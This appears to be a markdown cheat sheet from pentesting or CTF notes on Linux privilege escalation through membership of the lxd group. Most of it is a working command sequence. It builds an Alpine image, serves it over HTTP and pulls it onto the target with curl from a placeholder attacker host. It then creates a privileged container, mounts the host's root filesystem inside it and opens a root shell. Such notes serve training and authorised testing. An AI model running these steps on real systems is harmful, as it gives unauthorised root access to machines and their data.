# LXD / LXS
If you're a member of `lxd` group, you can elevate to root.

## Table of Contents:
- [Explanation](#user-content-explanation)
- [The process outline](#user-content-the-process)
- [The commands](#user-content-the-commands)
## Explanation:
From what I understand...
- LXC (**L**inu**x** **C**ontainer): This is kinda like a virtualised linux environment that can run virtualised systems inside it.
- LXD (**L**inu**x** **D**aemon):

  > LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.
  
  *from [HackingArticles](http://www.hackingarticles.in)*

## Getting PrivEsc:
### The process:
Basically, **if you're a member of `lxd` group, you can get a priv-esc**. A rough-outline of the process is:

  1. On your local machine, download the 'lxd-alpine-builder', and run the 'build-alpine' script inside the folder.
  2. Serve the created .tar.gz file over a HTTP server to your target
  3. On target machine, download this from your server, store it anywhere.
  4. Then, import this file into lxc, and check if it got placed correctly.
  5. Then, initialise lxd there (go with the defaults), followed by initialising lxc with the image you just imported.
  6. Mount the actual target machine's disk inside this image
  7. Start the virtualised system
  8. Open a shell into it
  9. You'll be seeing yourself as root in this virtual device, which is actually just mirroring the actual target machine's / folder.
### The commands:
**1. On local machine:**
```
git clone  https://github.com/saghul/lxd-alpine-builder.git # Get the alpine builder
cd lxd-alpine-builder # Go to the downloaded folder
./build-alpine # Build the required .tar.gz file
python -m SimpleHTTPServer 4444 #Serve this over to the target machine
```
**2. On target machine:**
```
# On target machine
cd /tmp # Directory where you've have RWX
curl -O http://your-host:4444/the-file.tar.gz # Downloading the archive on target machine
lxc image import ./the-file.tar.gz --alias myimage # Adding the env
lxc image list # Check if the env got added
lxd init # Intialising the daemon
lxc init myimage default -c security.privileged=true # Making the container
lxc config device add default mydevice disk source=/ path=/mnt/root recursive=true # Adding the device in to the container
lxc start default # Starting the virtual device
lxc exec default /bin/sh # You get a root shell
id # Check that you're root
```
